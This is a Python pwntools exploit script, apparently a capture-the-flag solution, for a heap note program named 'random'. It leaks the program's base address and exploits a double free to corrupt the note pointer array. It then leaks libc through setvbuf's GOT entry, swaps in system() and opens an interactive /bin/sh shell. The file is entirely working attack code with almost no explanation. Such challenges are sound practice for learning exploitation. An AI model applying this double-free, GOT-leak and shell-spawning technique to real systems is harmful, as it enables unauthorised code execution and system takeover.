#coding=utf-8
from pwn import *
local = 1
exec_file="./random"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)
if local :
    a=process(exec_file)
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *($text_base+0x0000000000011C4)
    b *($text_base+0x00000000000011AC)
    '''
    gdb.attach(a,script)
def do_pass():
    a.recvuntil("\n")
    a.sendline("N")
def dogame(flag):
    while True:
        s = a.recvuntil("\n")
        if flag in s:
            a.sendline("Y")
            break
        else:
            a.sendline("N")
def add(size,content,flag2):
    dogame("add")
    a.sendlineafter("Input the size of the note:\n",str(size))
    a.sendafter("Input the content of the note:",content)
    a.sendlineafter(", tomorrow?(Y/N)\n",flag2)
def delete(idx):
    dogame("delete")
    a.sendlineafter("Input the index of the note:\n",str(idx))
def show(idx):
    dogame("view")
    a.sendlineafter("Input the index of the note:\n",str(idx))
def edit(idx,content):
    dogame("update")
    a.sendlineafter("Input the index of the note:\n",str(idx))
    a.sendafter("Input the new content of the note:",content)
def init():
    a.recvuntil('Please input your name:\n')
    a.send('A'*8)
    a.recvuntil('A'*8)
    text_base = u64(a.recvuntil('?')[:-1].ljust(8,'\x00'))-0xb90
    a.sendlineafter("\n",str(35))
    return text_base
def one_day(times):
    a.sendlineafter("game today?(0~10)\n",str(times))
text_base=init()
success("text_base ==> 0x%x"%text_base)
ptr_addr = text_base+0x203180
success("info_array ==> 0x%x"%ptr_addr)
one_day(8)#1-8
#debug()
add(0x11,'A\n','Y') #增加一个add节点
#debug()
# double free chunk 0x555555758100
for i in range(7):
    do_pass()
one_day(7)#9 - 15
for i in range(7+2): # 7 + 1个add节点，然后delete节点再N
    do_pass()
#debug()
one_day(2)#16 - 17
add(0x11,p64(ptr_addr+0x20)+'\n',"N")
do_pass()
#debug()
one_day(5)#18 - 22
#debug()
add(0x21,'A\n',"N")
do_pass()
add(0x21,'A\n','N')
add(0x21,'A\n','N')
do_pass()

# malloc 9

# 16

one_day(6)
for i in range(6):
    do_pass()
#debug()
one_day(10)
setvbuf = elf.got["setvbuf"]

add(0x17,p64(text_base+setvbuf)+'\n','N')
show(3)
libc_base=u64(a.recv(6)+'\x00\x00')-libc.symbols["setvbuf"]
success("libc_base ==> 0x%x"%libc_base)
a.sendlineafter("\n","Y")
a.sendlineafter("\n","3")
a.sendlineafter("\n","A"*8+p64(libc_base+libc.symbols["system"]))
a.sendlineafter("\n","Y")
a.sendlineafter("\n","/bin/sh\x00")
a.interactive()





